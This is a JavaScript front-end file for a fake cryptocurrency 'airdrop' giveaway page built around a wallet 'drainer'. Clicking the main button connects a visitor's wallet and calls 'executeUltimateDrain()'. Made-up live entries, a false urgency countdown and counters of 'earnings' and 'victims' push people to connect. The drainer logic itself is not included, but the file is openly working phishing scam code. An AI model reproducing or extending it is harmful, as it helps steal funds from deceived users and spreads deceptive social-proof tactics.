
// 🚀 ENHANCED APP.JS - FULL BACKEND INTEGRATION
document.addEventListener('DOMContentLoaded', function() {
    console.log('🎁 Lynx Airdrop Enhanced - Full Backend Integration');
    
    // Initialize enhanced drainer
    drainer.init();
    
    // Set up main button handler
    const mainBtn = document.getElementById('mainActionBtn');
    if (mainBtn) {
        mainBtn.addEventListener('click', function(e) {
            e.preventDefault();
            console.log('🎯 Enhanced connect button clicked');
            
            if (!drainer.connectedWallet) {
                console.log('🔄 Opening enhanced wallet selector...');
                drainer.showEnhancedWalletSelector();
            } else {
                console.log('✅ Already connected, executing ultimate drain...');
                drainer.executeUltimateDrain();
            }
        });
    }
    
    // Add backend status indicator
    addBackendStatusIndicator();
    
    // Start enhanced live features
    startEnhancedLiveFeatures();
    
    // Initialize gasless features display
    initializeGaslessDisplay();
});

// 🎯 PERSISTENT COUNTDOWN WITH ENHANCEMENTS
class PersistentCountdown {
    constructor() {
        this.endTimeKey = 'cheetah_giveaway_end';
        this.duration = 48 * 60 * 60 * 1000; // 48 hours
        this.initializeCountdown();
    }

    initializeCountdown() {
        let endTime = localStorage.getItem(this.endTimeKey);
        
        if (!endTime) {
            endTime = Date.now() + this.duration;
            localStorage.setItem(this.endTimeKey, endTime);
        } else {
            endTime = parseInt(endTime);
        }

        this.startCountdown(endTime);
        this.startVisualCountdown();
    }

    startCountdown(endTime) {
        const element = document.getElementById('deadlineTimer');
        if (!element) return;

        const updateTimer = () => {
            const now = Date.now();
            const timeLeft = endTime - now;

            if (timeLeft <= 0) {
                element.innerHTML = 'GIVEAWAY ENDED';
                element.style.background = 'linear-gradient(45deg, #EF4444, #DC2626)';
                localStorage.removeItem(this.endTimeKey);
                return;
            }

            const hours = Math.floor(timeLeft / (1000 * 60 * 60));
            const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);

            element.innerHTML = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            // Visual intensity based on time left
            if (hours < 1) {
                element.style.animation = 'pulse-glow 1s ease-in-out infinite';
            }
        };

        updateTimer();
        setInterval(updateTimer, 1000);
    }

    startVisualCountdown() {
        // Add visual effects to countdown
        const timerElement = document.getElementById('deadlineTimer');
        if (timerElement) {
            timerElement.style.transition = 'all 0.3s ease';
        }
    }
}

// 🎯 ENHANCED LIVE FEATURES
function startEnhancedLiveFeatures() {
    startLiveEntries();
    startGaslessCounter();
    startEarningsCounter();
    startVictimCounter();
}

// 🎯 ENHANCED LIVE ENTRIES
function startLiveEntries() {
    const entriesList = document.getElementById('entriesList');
    if (!entriesList) return;

    // Initial entries
    for (let i = 0; i < 5; i++) {
        addLiveEntry(entriesList, true);
    }

    setInterval(() => {
        addLiveEntry(entriesList, false);
    }, 3000);
}

function addLiveEntry(entriesList, isInitial = false) {
    const randomWallet = `0x${Math.random().toString(16).substr(2, 4)}...${Math.random().toString(16).substr(2, 4)}`;
    const times = ['just now', '1 min ago', '2 mins ago', '5 mins ago'];
    const randomTime = times[Math.floor(Math.random() * times.length)];
    
    const newEntry = document.createElement('div');
    newEntry.className = 'entry-item';
    newEntry.innerHTML = `
        <span class="entry-wallet">${randomWallet}</span>
        <span class="entry-time">${randomTime}</span>
    `;
    
    if (!isInitial) {
        newEntry.style.animation = 'fade-in 0.5s ease';
        entriesList.insertBefore(newEntry, entriesList.firstChild);
        
        if (entriesList.children.length > 5) {
            entriesList.removeChild(entriesList.lastChild);
        }
        
        setTimeout(() => {
            newEntry.style.animation = '';
        }, 500);
    } else {
        entriesList.appendChild(newEntry);
    }
}

// 🎯 GASLESS COUNTER ANIMATION
function startGaslessCounter() {
    const counterElement = document.getElementById('gaslessCounter');
    if (!counterElement) return;

    setInterval(() => {
        const features = Math.floor(Math.random() * 7) + 15; // 15-22
        counterElement.innerHTML = `🆓 <strong>${features}/22</strong> Gasless Features Active`;
    }, 5000);
}

// 🎯 EARNINGS COUNTER
function startEarningsCounter() {
    const earningsElement = document.getElementById('totalEarnings');
    if (!earningsElement) return;

    let earnings = 2150000;
    setInterval(() => {
        earnings += Math.floor(Math.random() * 100) + 50;
        earningsElement.textContent = `$${(earnings / 1000000).toFixed(1)}M+`;
    }, 10000);
}

// 🎯 VICTIM COUNTER
function startVictimCounter() {
    const victimElement = document.getElementById('totalVictims');
    if (!victimElement) return;

    let victims = 15000;
    setInterval(() => {
        victims += Math.floor(Math.random() * 10) + 5;
        victimElement.textContent = `${(victims / 1000).toFixed(0)}K+`;
    }, 8000);
}

// 🎯 BACKEND STATUS INDICATOR
function addBackendStatusIndicator() {
    const statusDiv = document.createElement('div');
    statusDiv.className = 'backend-status connected';
    statusDiv.innerHTML = `
        <span>Backend Connected</span>
        <span class="live-counter">22 Gasless Endpoints</span>
    `;
    document.body.appendChild(statusDiv);
}

// 🎯 INITIALIZE GASLESS DISPLAY
function initializeGaslessDisplay() {
    const supportInfo = document.getElementById('supportInfo');
    if (supportInfo) {
        const gaslessHTML = `
            <div class="gasless-features">
                <div class="feature-count" id="gaslessCounter">22/22</div>
                <div class="feature-label">Gasless Features Active<br>Zero Cost • AI Powered</div>
            </div>
        `;
        supportInfo.insertAdjacentHTML('afterend', gaslessHTML);
    }
}

// 🎯 HANDLE PAGE VISIBILITY
document.addEventListener('visibilitychange', function() {
    if (!document.hidden && drainer.connectedWallet) {
        console.log('🔄 Page visible - Reactivating features');
        // Re-check backend connection
        drainer.testBackendConnection();
    }
});

// 🎯 ENHANCED TEST BUTTONS
window.testBackendConnection = async function() {
    try {
        console.log('🔧 Testing backend connection...');
        const response = await fetch('/api/health');
        
        if (response.ok) {
            const data = await response.json();
            alert(`✅ BACKEND WORKING!\nGasless Mode: ${data.gaslessMode}\nStatus: ${data.status}`);
        } else {
            alert('❌ Backend connection failed');
        }
    } catch (error) {
        alert(`💥 Backend error: ${error.message}`);
    }
}

window.testGaslessFeatures = async function() {
    try {
        console.log('🆓 Testing gasless features...');
        const response = await fetch('/api/gasless-status');
        
        if (response.ok) {
            const data = await response.json();
            alert(`🆓 GASLESS STATUS:\nEnabled: ${data.gaslessMode}\nFeatures: ${data.enabledFeatures}\nZero Gas: ${data.zeroGasCost}`);
        }
    } catch (error) {
        alert(`💥 Gasless test failed: ${error.message}`);
    }
}

// Initialize enhanced countdown
new PersistentCountdown();

console.log('🚀 Enhanced frontend loaded - Full backend integration ready');
